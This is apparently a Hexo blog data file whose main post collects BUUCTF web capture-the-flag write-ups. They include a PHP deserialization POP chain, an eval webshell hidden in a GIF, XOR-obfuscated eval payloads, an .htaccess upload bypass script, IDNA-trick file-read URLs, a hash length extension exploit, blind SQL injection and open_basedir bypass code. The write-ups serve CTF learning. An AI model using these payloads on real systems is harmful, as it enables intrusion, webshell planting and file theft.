{"meta":{"title":"Aesm1p' Blog","subtitle":"前方如聂鲁达的爱情诗一般美好","description":"相逢意气为君饮","author":"Aesm1p","url":"http://chaosec.top"},"pages":[{"title":"archives","date":"2018-01-25T06:48:22.000Z","updated":"2018-01-25T12:22:49.935Z","comments":true,"path":"archives/index.html","permalink":"http://chaosec.top/archives/index.html","excerpt":"","text":""},{"title":"About Me","date":"2020-09-13T07:24:58.340Z","updated":"2020-09-13T07:24:58.340Z","comments":false,"path":"about/index.html","permalink":"http://chaosec.top/about/index.html","excerpt":"","text":"把酒祝东风，且共从容。 Author: aesm1pUniversity: CUMTEmail: aesm1p#163.com(请将#换成@)"},{"title":"All categories","date":"2018-01-25T07:11:11.609Z","updated":"2018-01-25T07:11:11.609Z","comments":true,"path":"categories/index-2.html","permalink":"http://chaosec.top/categories/index-2.html","excerpt":"","text":""},{"title":"categories","date":"2020-09-12T14:42:40.000Z","updated":"2020-09-12T14:42:40.488Z","comments":true,"path":"categories/index-3.html","permalink":"http://chaosec.top/categories/index-3.html","excerpt":"","text":""},{"title":"All categories","date":"2020-09-12T14:43:27.734Z","updated":"2018-01-25T07:04:01.037Z","comments":true,"path":"categories/index.html","permalink":"http://chaosec.top/categories/index.html","excerpt":"","text":""},{"title":"category_archive","date":"2019-01-30T04:05:38.000Z","updated":"2019-01-30T04:05:38.357Z","comments":true,"path":"category-archive/index.html","permalink":"http://chaosec.top/category-archive/index.html","excerpt":"","text":""},{"title":"schedule","date":"2019-01-30T06:24:13.000Z","updated":"2019-01-30T08:46:23.627Z","comments":true,"path":"schedule/index.html","permalink":"http://chaosec.top/schedule/index.html","excerpt":"","text":""},{"title":"B&M&M&V","date":"2020-03-17T15:31:16.041Z","updated":"2020-03-17T15:31:16.041Z","comments":false,"path":"soul/index.html","permalink":"http://chaosec.top/soul/index.html","excerpt":"The article has been encrypted, please enter your password to view.","text":"相逢意气为君饮 Incorrect Password! No content to display! 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"},{"title":"tag_archive","date":"2019-01-30T04:08:14.000Z","updated":"2019-01-30T04:08:14.493Z","comments":true,"path":"tag-archive/index.html","permalink":"http://chaosec.top/tag-archive/index.html","excerpt":"","text":""},{"title":"All tags","date":"2018-01-07T06:29:33.000Z","updated":"2018-01-07T06:31:36.622Z","comments":true,"path":"tags/index.html","permalink":"http://chaosec.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"BUUCTF_WEB(二)","slug":"buuctf1","date":"2020-09-14T14:58:44.000Z","updated":"2020-09-14T14:58:44.063Z","comments":true,"path":"2020/09/14/buuctf1/","link":"","permalink":"http://chaosec.top/2020/09/14/buuctf1/","excerpt":"[强网杯 2019]Upload","text":"[强网杯 2019]Upload [强网杯 2019]Upload 题目流程走了一圈，没发现有什么利用点。查看cookie，发现存在base64编码的反序列化信息，所以猜测有源码泄露，扫目录发现题目存在源码泄露www.tar.gz，下载源码之后审计源码，既然题目是Upload，应该和上传有关，查看上传部分代码123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125;&#125;可以看到上传之后题目都被强制修改后缀为png，无法执行PHP代码，所以要寻找其它漏洞点，结合前面的cookie，查找反序列化相关代码，发现在上传图片后会进行序列化操作1234public function update_cookie()&#123; $this-&gt;checker-&gt;profile['img']=$this-&gt;img; cookie(\"user\",base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); &#125;在首页存在反序列化操作123456789101112public function login_check()&#123; $profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db('user')-&gt;where(\"ID\",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125;&#125;接下来尝试构造pop链在Profile类中，存在两个魔术方法1234567891011public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125;__call的触发需要调用不存在的方法，而在Register类的析构函数中123456public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125;此处调用了不存在的index方法，可以触发__call方法，然后__call方法又可以触发__get方法，这样，通过__get方法可以执行我们想要执行的函数，而在Profile类的upload_img函数正好存在利用点12345678910111213141516public function upload_img()&#123; ... if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125; ...&#125;我们可以通过控制$ext=1是代码进入此流程，先上传恶意图片，然后利用@copy($this-&gt;filename_tmp, $this-&gt;filename);来修改我们上传的文件后缀名从而getshell攻击流程：先上传恶意图片文件，内容为12GIF89a&lt;?php @eval($_REQUEST[&#39;snow&#39;]); ?&gt;查看网页源代码获取到该图片的存储位置，序列化代码如下12345678910111213141516171819202122232425262728293031namespace app\\web\\controller;class Profile&#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; function __construct() &#123; $this-&gt;except = array('index'=&gt;'upload_img'); $this-&gt;ext = 1; $this-&gt;filename_tmp = './upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png'; $this-&gt;filename = './upload/snow.php'; &#125;&#125;class Register&#123; public $checker; public $registed; function __construct($a)&#123; $this-&gt;checker = $a; $this-&gt;registed = 0; &#125;&#125;$a = new Profile();$b = new Register($a);//echo serialize($b);echo base64_encode(serialize($b));替换cookie后刷新页面，访问上传的图片地址即可getshell [SUCTF 2019]Pythonginx 本题给出了源代码，是一个flask项目，会返回我们提交的url中的内容123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl, timeout=2).read() else: return \"我扌 your problem? 333\"提示我们需要读文件，先是限制了host不能是suctf.cc（如果是函数就返回了），但是后面又显示必须是suctf.cc，关键点就在urlsplit函数，在blackhat2019会议上提到了此漏洞，通过inda编码的字符在进行unicode解码时会导致字符逃逸，例如℀会变成a/c，显然，这样会导致路径插入，比如suctf.c℀om可以变成suctf.ca/com，从而实现逃逸回到本题，我们可以直接找一个能解码成c的特殊字符即可payload如下:12file:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conffile:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;fffffflag [SUCTF 2019]EasyWeb 题目给出了源代码12345678910111213141516171819202122232425262728293031function get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[\"file\"]))&#123; $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET['_'];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die('One inch long, one inch strong!');&#125;if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(\"Almost there!\");eval($hhh);?&gt;题目过滤了大量字符，经测试还有^可以用，参考p牛的方法使用异或进行代码执行，因为存在长度限制，所以使用字符数比较短的GET变量小知识点： 在PHP中，url 参数默认是字符串类型fuzz脚本：1234567891011$s = '_GET';print('%'.dechex(244).' ');for($j=0;$j&lt;strlen($s);$j++)&#123; for($i=0;$i&lt;255;$i++)&#123; $a = chr(244)^chr($i); if($a == $s[$j])&#123; echo '%'.dechex($i); break; &#125; &#125; &#125;payload：1$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4&#x3D;phpinfo由于长度受限，我们只能执行简单的函数，想要进行读文件等操作还是需要getshell，题目还给出了get_the_flag函数，其中存在上传功能，可以利用此函数进行文件上传，该函数存在过滤点 后缀检测 文件内容检测，文件中不得出现&lt;? exif_imagetype 可以通过文件上传加.htaccess进行绕过，代码没有表单，可以找个上传点抓包然后和本题数据包拼接一下就可以上传了，绕过2处的过滤，需要对PHP文件进行编码PS:因为是base64编码，所以要保证字符长度是4的倍数，如果不够的话要自己凑一下然后访问a.ooo即可解析为PHP代码当然，也可以使用脚本上传12345678910import requestsurl = r\"http://84ae465d-bec5-48bb-965b-bd7f4b51394f.node3.buuoj.cn/?_=$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4=get_the_flag\"file1 = &#123;'file': ('a.ooo', 'GIF89aaa\\nPD9waHAgQGV2YWwoJF9SRVFVRVNUWyJzbm93Il0pO3BocGluZm8oKTs/Pg==')&#125;file2 = &#123;'file': ('.htaccess', '#define width 45\\n#define height 45\\nAddType application/x-httpd-php .ooo\\nphp_value ' 'auto_append_file \"php://filter/convert.base64-decode/resource=a.ooo\"')&#125;r = requests.post(url, files=file1).textprint(r)r = requests.post(url, files=file2).textprint(r)访问网站flag文件存在提示信息 hhhhThis is fake flagBut I heard php7.2-fpm has been initialized in unix socket mode!~ 需要我们绕过open_basedir限制，我们可以选择绕过该限制，也可以选择直接绕过disable_functions（推荐这种方法，蚁剑有插件） payload1upload&#x2F;tmp_bad194011f5ad0cf609c77ad222e50d6&#x2F;a.ooo?snow&#x3D;chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);var_dump(file_get_contents(%27&#x2F;THis_Is_tHe_F14g%27)); [SUCTF 2019]Upload Labs 2 php://filter/resource=phar://./upload/bad194011f5ad0cf609c77ad222e50d6/b5e9b4f86ce43ca65bd79c894c4a924c.gif [De1CTF 2019]SSRF Me 题目给出源码和提示flag is in ./flag.txt 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0') 题目很明显是在考察哈希长度扩展攻击，但是在读文件的时候过滤了gopher和file协议，不过找到一篇文章(http://13.58.107.157/archives/8936)说可以使用local_file协议，该协议是linux下支持的一个协议，也可以实现读文件流程如下：先访问geneSign页面生成签名，这里要把我们的参数设定好，由于提示已经给出了flag位置，所以通过local_file:flag.txt即可读到flag在生成签名之后，用hashpump生成即可 PS: input sig 填写我们获得的签名，input data填写之前生成签名的明文最后几位字符，input key len填写明文总长度减去input data长度后的值，最后填写我们要添加的值。 将结果中的\\x替换为%后按照要求提交即可，exp如下(cookie要在headers中提交，否则会报错)：1234567891011121314151617import requestsfrom urllib import parseimport jsonurl = 'http://e78b915e-84fa-4293-a7eb-51e747ff6e43.node3.buuoj.cn/'sig = requests.get(url+'geneSign?param=local_file:flag.txt').content.decode('utf-8')print(sig)# 用hashpump生成替换值headers = &#123; \"Cookie\": r\"action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read; sign=a21ff75fdafd472a4e5abda397747fa0\"&#125;flag = requests.get(url+'De1ta?param=local_file:flag.txt',headers=headers).content.decode('utf-8')print(json.loads(flag)['data']) [De1CTF 2019]Giftbox 这题出的挺不错的，虽然整体考点并不难，但是却很考验综合能力，题目给出了源码（看了大佬wp才知道，原题是没有给源码的）首先得说师傅这前端做的真是漂亮，佩服。题目给了一个模拟shell，可以执行简单的命令，简单usage.md可以看到一些主要命令，但是需要登录登录界面进行测试发现存在注入，没有任何过滤，不过由于输入空格会被当做命令分隔符，所以需要用注释符来绕过空格，查看浏览记录发现每次请求时需要输入totp值，查看js代码发现这是Google的一个一次性身份验证算法，查看main.js有一段注释信息，基本给出了totp算法的各项参数12345678/*[Developer Notes]OTP Library for Python located in js/pyotp.zipServer Params:digits = 8interval = 5window = 1*/python下正好就有相应库，那么编写盲注脚本：123456789101112131415161718192021import requestsimport pyotpfrom urllib import parsesec = 'GAXG24JTMZXGKZBU'totp = pyotp.TOTP(sec, digits=8, interval=5)url = 'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'password = ''payload_pre = \"?totp=&#123;&#125;&amp;a=\"for i in range(1, 60): for j in range(34, 127): tmp = parse.quote(\"login ad'/**/or/**/ascii(substr((select/**/password/**/from/**/users/**/where/**/username='admin'),&#123;&#125;,1))=&#123;&#125;# pa\".format(len(password)+1, j)) res = requests.get(url+payload_pre.format(totp.now()) + tmp).content.decode('utf-8') if 'password incorrect' in res: password += chr(j) print(password) break if j == 127: print('finished.') exit()得到密码hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}，密码中给出了命令提示sh0w_hiiintttt_23333，尝试运行一下12[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333we add an evil monster named &#39;eval&#39; when launching missiles.那么基本就是命令执行了，登录之后，执行targeting命令设定参数，存在过滤123456789101112131415161718192021222324252627function checkCode($code)&#123; $table='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if (strlen($code)&gt;2)&#123; return 'code too long.'; &#125; for ($i=0; $i&lt;strlen($code); $i++) &#123; if (strpos($table,$code[$i])===FALSE)&#123; return 'bad code.'; &#125; &#125; if (file_exists($sandbox.'missiles/'.md5($_SERVER['REMOTE_ADDR']).'/'.$code))&#123; return 'target existed.'; &#125; return NULL;&#125;function checkPosition($position)&#123; $table='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#125;)$(&#123;_+-,.'; if (strlen($position)&gt;12)&#123; return 'position too long.'; &#125; for ($i=0; $i&lt;strlen($position); $i++) &#123; if (strpos($table,$position[$i])===FALSE)&#123; return 'bad position.'; &#125; &#125; return NULL;&#125;在设定参数之后，如targeting a b，后台会把我们的处理为$a=&quot;b&quot;，然后带入eval中执行，由于使用了双引号包裹变量导致了漏洞，因为在PHP中，双引号包裹的变量会被PHP尝试解析https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing，利用此特性我们就可以进行函数执行，尝试执行phpinfo()，targeting a ${phpinfo()}，将返回页面保存到本地打开可以看到函数执行信息可以看到题目设置了basedir，需要进行绕过，payload如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import requestsfrom urllib import parseimport pyotpimport resec = 'GAXG24JTMZXGKZBU'totp = pyotp.TOTP(sec, digits=8, interval=5)session = requests.session()base_url = 'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'def login(sig): url = base_url + '?a=&#123;&#125;&amp;totp=&#123;&#125;' payload = parse.quote('login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;') con = session.get(url.format(payload, sig)).text print(con)def destruct(sig): url = base_url + '?a=&#123;&#125;&amp;totp=&#123;&#125;' payload = 'destruct' con = session.get(url.format(payload, sig)).text print(con)def targeting(sig, payload): url = base_url + '?a=&#123;&#125;&amp;totp=&#123;&#125;' con = session.get(url.format(parse.quote(payload), sig)).text print(con)def launch(sig): url = base_url + '?a=&#123;&#125;&amp;totp=&#123;&#125;' payload = 'launch' con = session.get(url.format(payload, sig)).text flag = re.findall(r'(flag\\&#123;[a-z0-9\\-]+\\&#125;)',con) if flag: print(flag[0]) else: print(con)login(totp.now())destruct(totp.now())# phpinfo()# payloads = ['targeting a $&#123;phpinfo()&#125;']# scandir('/')# payloads = ['targeting a chdir','targeting b img','targeting c &#123;$a($b)&#125;','targeting d ini_set','targeting e open_basedir',# 'targeting f ..','targeting g &#123;$d($e,$f)&#125;','targeting h &#123;$a($f)&#125;','targeting i &#123;$a($f)&#125;','targeting j chr',# 'targeting k &#123;$j(47)&#125;','targeting l &#123;$d($e,$k)&#125;','targeting m scandir','targeting n print_r','targeting o &#123;$n($m($k))&#125;']# file_get_contents('/flag')payloads = ['targeting a chdir','targeting b img','targeting c &#123;$a($b)&#125;','targeting d ini_set','targeting e open_basedir', 'targeting f ..','targeting g &#123;$d($e,$f)&#125;','targeting h &#123;$a($f)&#125;','targeting i &#123;$a($f)&#125;','targeting j chr', 'targeting k &#123;$j(47)&#125;','targeting l &#123;$d($e,$k)&#125;','targeting m flag','targeting n $k$m','targeting o file_get_', 'targeting p contents','targeting q $o$p','targeting r &#123;$q($n)&#125;']for each in payloads: targeting(totp.now(), each)launch(totp.now())","categories":[{"name":"复现","slug":"复现","permalink":"http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://chaosec.top/tags/Web/"}]},{"title":"Rootme网站做题记录(三)","slug":"rootme2","date":"2020-09-13T14:41:21.000Z","updated":"2020-09-14T13:34:31.943Z","comments":true,"path":"2020/09/13/rootme2/","link":"","permalink":"http://chaosec.top/2020/09/13/rootme2/","excerpt":"The article has been encrypted, please enter your password to view.","text":"Password plz... Incorrect Password! No content to display! 